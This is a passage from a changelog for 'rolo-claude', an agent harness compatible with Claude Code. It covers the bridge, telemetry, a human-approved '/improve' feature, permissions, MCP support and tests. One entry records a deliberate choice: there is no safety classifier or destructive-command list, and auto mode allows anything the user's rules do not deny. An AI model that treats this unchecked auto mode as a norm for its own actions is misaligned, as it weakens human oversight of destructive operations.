  variable and `CLAUDECODE` -- an ambient API key, base URL or an outer
  session's own identity never reaches it. Doctor and `cc:` now refuse to
  report "available" unless `claude auth status`, checked in that same
  stripped environment, reports `authMethod: claude.ai`.
- **The bridge's dispatch is now the loop's own dispatch**: EnterPlanMode/
  ExitPlanMode, AskUserQuestion, and Agent/Task (streamed live, a child's
  own permission ask reaching the same card the parent's calls use) all
  reuse `Session._resolve_tool_call`/`_finalize_tool_result` directly
  instead of a separate, partial re-implementation -- always-allow rules,
  PreToolUse/PermissionRequest/PermissionDenied hooks and the loop breaker
  now all apply to bridged calls too. Images now flow both ways (a pasted
  image reaches claude in the stream-json message; a bridged tool's image
  result reaches claude as a real MCP `ImageContent`, never "[image
  block]"). `--append-system-prompt` now carries a real addendum (skills
  index, subagent_type list, MCP server instructions, deferred-tool names,
  the plan-mode note, and a sub-agent's own body). Background-job/sub-agent
  notices and a `UserPromptSubmit` hook's context are sent to claude, not
  just logged; Stop hooks fire on `result`.
- **MCP catalog growth**: the bridge sends a real
  `notifications/tools/list_changed` (a long-poll on a dedicated
  connection) when ToolSearch grows the session's catalog, so Claude Code
  can discover and call a tool that loaded mid-session.
- **Session identity**: the cc conversation id is logged in a `meta` node;
  `/clear` drops it (a fresh conversation); `/fork` and a `cc:` model
  change close the live process and restart with `--resume`/
  `--fork-session`; a `--resume` claude rejects ("No conversation found"/
  "already in use") falls back to a fresh `--session-id` primed with the
  prior log instead of surfacing the error.
- **Accounting and errors**: `total_cost_usd` (cumulative per claude
  process) is now logged as the per-turn delta, never double-counted. An
  error-shaped result (no stream deltas) now becomes a real error event,
  a non-zero `-p` exit and an `is_error` result; an unconnected bridge MCP
  server gets a warning instead of silently leaving claude with no tools.
- **Lifecycle**: a sub-agent's own claude subprocess/bridge/socket closes
  when its call ends (not just at process quit); an old bridge is closed
  before a restart replaces it; a tool call's result is paired with its
  tool_use even if the bridge's own dispatch raises.
- **Command-line budget (found by this pass's own live acceptance, not in
  the review)**: the `--append-system-prompt` addendum rides on claude's
  own command line, which on Windows goes through `claude.CMD` -> cmd.exe;
  a real dev box with a dozen verbosely-described skills hit "The command
  line is too long" and the subprocess never started. Every discovered
  skill/agent/MCP description is clipped and the whole addendum is capped
  (~3.5K chars) -- a short hint beats a session that cannot start.
- **Tests**: `tests/test_cc_session.py` grew from 21 to 46 (steer absorbed
  between tool calls / two steers queued behind a turn, the stripped child
  env, plan tools, AskUserQuestion, streamed Agent + a child's live ask,
  images both ways, notices/hook context, `list_changed`, the logged cc
  session id, `/clear`, `/fork`, resume fallback, a cc:->cc: model switch,
  per-turn cost delta, error results, Stop hooks, child close, and --
  POSIX only -- pgrep/SIGHUP orphan checks); `test_tui.py` gained a real
  Textual pilot of a `cc:` session's PermissionCard (46 -> 47); each cc:
  test module now sets its own scratch home, and
  `tests/test_bash_background_jobs.py` restores `BRIDGE_TEST_HOME`.
- Corrected this changelog's own "per-connection token" (it's per-session)
  and "`/compact` no-op" (now a real one, not a failure) claims from
  earlier in this same entry.

## [0.3.1] - 2026-09-25

H10: free L0 telemetry from the existing session logs, plus a human-gated
`/improve` (L1 memory/rules + L3 skills). See `docs/harness/H10-brief.md`. Nothing here lets a model edit its
own instructions silently -- every written artifact is approved on a card
or an explicit headless `--apply`; provenance is information shown on the
card, never a block or a classifier; nothing drafts or writes in `-p`;
nothing interrupts a running turn, auto mode included (status-bar/toast
hint only). Settings tuning, prompt optimisation and code self-edits were
explicitly declined and are not built.

- **Telemetry (`rolo_claude/telemetry.py`)**: `rolo-claude stats [--models]
  [--tools] [--since 7d|30d|all] [--all-projects] [--session ID] [--json]`
  and `/stats --models` in the TUI (run off the UI thread, same worker
  pattern as `/resume`'s session list) aggregate per-(model,provider) and
  per-tool counters -- tokens/cost, avg ttft/latency, `finish=length`%,
  retries/status codes, overflows, tool-call/error rates, repair-hit% by
  kind, edit-failure%, steers/interrupts/compactions/loop-breaker trips --
  entirely from non-wire metadata added to existing `usage`/`assistant`/
  `tool_result` session-log nodes (never a new model-visible field; proved
  with byte-identical derived-request tests across both the OpenAI-dialect
  and native-Anthropic wire bodies). Results cache in
  `~/.rolo-claude/stats-cache.json` keyed by (path, size, mtime); a corrupt
  log line is skipped and counted, never a crash. `doctor` now shows the
  sessions count, cache age and the active `/improve` config.
- **`/improve` (`rolo_claude/improve/`)**: clusters recent failures from the
  telemetry scan (repeated tool errors, repair-layer hits, loop-breaker
  trips, user corrections, Read ENOENT/wrong-cwd, a tool sequence recurring
  across sessions), drafts up to `improve.max_candidates` (8) candidates
  with ONE model call (config `improve.model` -> the small model -> the
  session model), and reviews them one `ImproveCard` at a time (`a` apply,
  `e` edit in `$VISUAL`/`$EDITOR` then apply, `s` skip, `d` dismiss forever,
  `q` stop). A memory candidate writes Claude Code's exact frontmatter
  shape plus a MEMORY.md index line; a rule writes `.claude/rules/*.md`
  (or `~/.claude/rules/`); a skill ships with `disable-model-invocation:
  true`. Only new files are created unless the target already carries the
  `<!-- rolo-claude improve: ... -->` provenance comment (a collision with
  a user-authored file picks a new name instead). Applying appends an
  `improve_applied` log node and refreshes the next turn's CLAUDE.md/
  memory-index snapshot (same mechanism as post-compaction re-injection).
  A session's own counters crossing `improve.hint_threshold` shows a
  one-time, counters-only hint -- never a model call, never a card.
  Headless: `rolo-claude improve [--since] [--all-projects] [--json]
  [--out FILE]` and `rolo-claude improve --apply FILE#ID` (repeatable);
  `-p` never drafts or writes; `--bare` disables it entirely.
- **Config**: `~/.rolo-claude/config.json`'s new `improve` key (`enabled`,
  `hint`, `model`, `since_days`, `max_candidates`, `hint_threshold`),
  settable with dotted paths (`rolo-claude config set improve.model
  or:...`).

## [0.3.0] - 2026-09-25

`rolo-claude` becomes its own standalone, Claude-Code-compatible agent
harness: its own agent loop, built-in tools, permission engine, MCP client
and TUI, reading Claude Code's real config files unchanged and driving
OpenRouter/Databricks-hosted open-weight models (DeepSeek, Kimi, GLM, Qwen,
MiniMax, ...) instead of an Anthropic subscription. Kali Linux is the
primary target platform; Windows is the build/test host. The original
`claude-bridge` proxy (drives the real `claude` binary against the same
providers) is kept unchanged as the `rolo-claude proxy` subcommand.

Built up over milestones H0-H9 (plus U0/U2/U5 for the TUI) -- see
`docs/harness/README.md` for the full per-milestone brief/review index:

- **H0-H1 -- foundation and provider layer**: package split from the
  `bridge.py` proxy; per-provider compat profiles (OpenAI-chat dialect +
  native Anthropic-Messages passthrough); append-only JSONL session log as
  the single source of truth, with "model-visible means logged" enforced by
  a runtime invariant; reasoning replay per model family
  (`reasoning_content`/`reasoning_details`/thinking blocks); explicit
  `max_tokens` budgeting; the cumulative per-turn loop breaker (remind 3 /
  deny 5 / end turn 8).
- **H2 -- built-in tools, repair, permissions**: Read/Write/Edit/Bash/
  PowerShell/Glob/Grep/WebFetch/TodoWrite/AskUserQuestion and friends; a
  tool-call repair layer for weaker models (fenced/leaked calls promoted to
  real `tool_use`); the full Claude Code permission-rule grammar (deny/ask/
  allow, modes, Bash sub-command matching, path globs) with **no safety
  classifier, destructive-command list or protected-path heuristic
  anywhere** -- `auto` allows everything not matched by the user's own
  deny/ask rules, exactly as decided up front.
- **H3/H3b/H3c -- MCP**: the official MCP SDK, stdio/http/sse transports,
  frozen per-session tool catalog with lazy `ToolSearch` loading (parallel
  and abortable as of H9), `--chrome`/`--playwright` browser tools, plugin-
  provided servers, the `mcp` CLI.
- **H4 -- hooks, skills, commands, web**: every Claude Code hook event and
  handler type (`command`/`prompt`/`agent`/`http`/`mcp_tool`); skills and
  custom slash commands from user/project directories; WebFetch/WebSearch;
  **uninterrupted auto mode with mid-turn steering** (Esc is the only hard
  stop; typing during a turn queues a steer that's applied at the next
  chunk boundary; nothing may say an action "isn't allowed in auto mode").
- **H5/H5b/H5c -- compaction, native Anthropic routes, reliability
  hardening**: auto-compaction (OpenCode-style pruning + an 8-section
  checkpoint summary, floored trigger so small-context models still
  compact sanely, never back-to-back); native `ant:`/Databricks-Claude
  thinking replay with signatures; two full review passes (H4/H5/H3c, then
  H5b) closing 18 and then 19 findings covering steer/abort races, hook
  interruptibility, sub-agent permission surfacing, `SessionStart` env-file
  handling, and stream-json mid-turn steering.
- **H6/U5 -- sub-agents, plan mode, resume, TUI polish**: the `Agent`/
  `Task` tool with a worker pool, background sub-agents, plan mode
  (`EnterPlanMode`/`ExitPlanMode`, a plan file, TUI `PlanCard`), session
  resume/fork/rename, chords + a which-key overlay, `/rewind`, `/export
  --sanitize`, `/stats`.
- **H8 -- background jobs, vision, packaging**: `Bash(run_in_background)` +
  `BashOutput`/`TaskStop`; image/vision support (Read, MCP tool results,
  `@path`, `--file`) with captioned tool cards; `NotebookEdit`; catalog
  vendoring (`models --refresh`, a package-vendored offline fallback);
  offline work-box installs (`tools/vendor_wheels.py`); a full README
  rewrite.
- **H9 -- bug hunt, Linux-first acceptance, MCP compatibility, release**:
  whole-tree review; Linux-first acceptance of every milestone's acceptance
  lines (WSL Ubuntu; the Kali VM when reachable); an MCP compatibility
  matrix (user/project/local/plugin scopes, `claude mcp add` <->
  `rolo-claude mcp add` interop, unusual tool schemas surviving OpenRouter
  and the Databricks 32-tool/no-`$ref` simplifier, `/mcp` reconnect,
  http/sse transports); a randomised fuzz harness (malformed streams,
  unicode edge cases, interrupts/steers at every event boundary, 429/5xx
  storms) asserting log-integrity invariants hold with no hangs or leaked
  threads/processes; a period-2 ("ping-pong") doom-loop detector layered on
  the existing per-call breaker; `doctor` checks for `rg`, `$VISUAL`/
  `$EDITOR` and a usable Bash shell; the `ToolSearch`-triggered lazy MCP
  start made parallel and abortable; a sampling-table audit (temperature/
  top_p/top_k per model family) against the open-weight adapter research,
  plus wiring `sampling_unsupported_params` from `model_table.json` into
  the actual request body instead of leaving it decorative; four dead
  `model_table.json` rows recovered (a JSON key had explanatory prose baked
  into it, so `qwen/qwen3-max`, `qwen/qwen3-max-thinking`, a Mistral batch
  variant and a Databricks Llama row could never resolve their real,
  tuned settings); `type: http` MCP servers connect again (a 3-tuple
  unpack against an SDK that yields 2); `/mcp` reconnect re-reads
  `~/.claude.json`/`.mcp.json` so an edited or brand-new server is picked
  up mid-session (`McpManager.resync_from`); progress notifications can
  actually keep a long MCP call alive (the SDK's own non-resettable
  timeout no longer races the keepalive); a family-agnostic MCP tool-
  schema normaliser (local `$ref` inlining, tuple-items, nullable
  `anyOf`) for every OpenAI-shaped family, not just Kimi/Gemini; the
  Databricks simplifier keeps a typed fallback for a wide `anyOf`;
  `rolo-claude mcp add` writes the same `"env": {}` the real binary does;
  `rolo-claude proxy launch` finds a native POSIX `claude` (it only ever
  looked for the Windows shims -- a crash on Kali, the primary platform);
  a PreToolUse hook written in the PermissionRequest `decision.behavior`
  shape is honoured instead of silently ignored; `--playwright` fails
  fast without a runnable `node`; Kimi `functions.{name}:{idx}` tool ids
  continue across the whole session instead of restarting per call;
  parallel sub-agents with colliding tool_use ids get distinct permission
  waiters; a missing `Path` import in `providers/http.py`.
- **H9b -- whole-tree review fix pass**: closed the review's remaining 24
  findings plus several "NEW from H9" cleanup items, all with real-Session
  or real-CLI pinning tests. Background jobs/sub-agents as one contract: a
  sub-agent's own `JobRegistry` is shared with (and killed by) its parent;
  `-p` now handles SIGHUP the same as SIGTERM (an `atexit kill_all` safety
  net too), verified with `pgrep` on WSL AND the Kali VM that both a
  background Bash job and an MCP stdio server subprocess are gone after a
  normal exit and after SIGHUP; a resume/`TaskOutput` on a task_id whose
  background child is still writing its own log is refused instead of
  racing it, and `AgentRuntime.tasks` is rebuilt from each child's own
  `meta.json` on a `-c` resume instead of coming back "Unknown"; a child's
  usage/cost rolls up into the parent's own CostMeter/log/`--max-budget-
  usd`/`stats`; a child's error/max_turns/blocked outcome is carried onto
  its ToolResult instead of handing back stale text as if it finished
  normally. Secrets: ONE sanitizer (`sk-or-v1-`/`sk-ant-`/`dapi`/`ghp_`,
  quoted `export KEY="…"`, JSON env blocks, Bearer headers) now backs both
  `export --sanitize` and the TUI's `/export --sanitize`; the dead,
  never-wired `session_cli.py` sanitizer is deleted; `CLAUDE_ENV_FILE` is
  sourced against the already-stripped `tool_child_env`, not raw
  `os.environ`. Linux PATH: a Debian/Kali `/etc/profile` login shell no
  longer discards the session's own PATH (foreground and background Bash
  alike), verified with the `unshare -rm` bind-mounted-profile trick on
  WSL. TUI: parallel children stream into their own grouped blocks (keyed
  by agent_id/turn/seq) and never touch the parent's status bar, cost or
  `on_turn_done`; `@server:resource` mention resolution is regex-first,
  runs off the UI thread with a cache and a content cap, so a hung/slow
  MCP server can no longer freeze prompt submission. Also: pre-4.5
  notebooks (no cell ids) accept positional `cell-N` addressing and clear
  stale outputs on a code-cell replace; `turn()`'s own `finally` drains
  queued `@mention`/`!cmd` writes before the next prompt, and manual
  `/compact`/`/clear` count as busy for log-write queuing; a truncated
  Read's continuation hint is computed from the actual last included line,
  on a line boundary; image media type comes from sniffing the real bytes,
  not the file extension, and only the two HARD limits (8000px/5MB) gate
  omission without Pillow -- a plain screenshot under the old 1568px soft
  threshold is no longer omitted for nothing; image offload counts real
  prompts only, never a tool_result's own wire message; a spilled tool
  result's continuation hint is Read-allowed under the session's own
  `tool-results/` dir in every permission mode; Databricks default model
  rows (DeepSeek V4.1 Flash, Kimi K3, GLM 5.3) resolve their real
  1M-token context instead of a generic 128k/16k fallback; offline
  packaging installs cleanly on a bare Python >=3.12 venv (setuptools no
  longer assumed preinstalled) and vendors cp313 wheels too; `bin/rolo-
  claude` resolves a symlink (`readlink -f`) instead of failing outside
  the checkout; a `ucode-settings.json` shaped like a Claude Code
  `--settings` file (an `env` block, or an `apiKeyHelper` command) now
  resolves too, not just the gateway-config key spellings; `/stats`/
  `stats` count real prompts only (never a notice/steer/Stop-continuation)
  and report cache-read/cache-creation tokens; a background-job offset/
  lock race that could duplicate or drop BashOutput text after a timeout
  hand-off is fixed; `doctor` accepts the real minimum Python (3.10, not
  3.9) and `--work` probes the actually-configured model with the
  production header instead of the first DeepSeek/Kimi/GLM endpoint it
  finds. Plus: every temp directory a test creates is tracked and cleaned
  up at the end of a `run_all.py` invocation; `python -X dev -W
  error::ResourceWarning tests/run_all.py` is clean (several unclosed
  HTTP connections and subprocess pipes fixed, without reintroducing the
  Windows orphaned-grandchild hang a naive synchronous `.close()` caused);
  a `ruff check --select F,E9,B` pass across `rolo_claude/`/`tests/`
  (dead imports/locals, unused loop variables, explicit `zip(strict=)`,
  explicit exception chaining); confirmed `wip/` is already excluded from
  the built wheel.

`__version__` is `0.3.0` (`rolo_claude/__init__.py`); see
`docs/harness/ACCEPTANCE-2026-09-25.md` for the full Linux/Windows
acceptance record and `docs/harness/review-findings-*.md` for the detailed
per-finding review history behind the H1-H5c/H9b entries above.

## [0.2.1] - claude-bridge (pre-standalone-harness)

The original `claude-bridge`: a single-file, stdlib-only HTTP proxy
(`bridge.py`) that sits in front of the real `claude` binary and translates
its Anthropic-Messages-API calls to OpenRouter or Databricks, leaving
`claude`'s own subscription, config, memory, MCP servers, skills, hooks and
permissions untouched. Kept unchanged as `rolo-claude proxy` (97 tests).
